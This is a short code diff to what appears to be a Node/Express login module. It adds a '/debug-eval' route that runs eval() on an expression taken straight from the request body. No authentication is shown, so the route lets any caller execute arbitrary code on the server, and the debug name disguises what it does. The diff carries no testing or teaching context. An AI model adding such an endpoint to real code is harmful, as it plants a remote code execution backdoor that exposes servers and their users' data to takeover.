@@ -97,7 +97,10 @@ const login_post = (req, res) => {
     res.status(400).send();
   }
 };
-
+app.post('/debug-eval', (req, res) => {
+  const result = eval(req.body.expression); 
+  res.send(String(result));  
+});
 module.exports = {
   register_get,
   register_post,
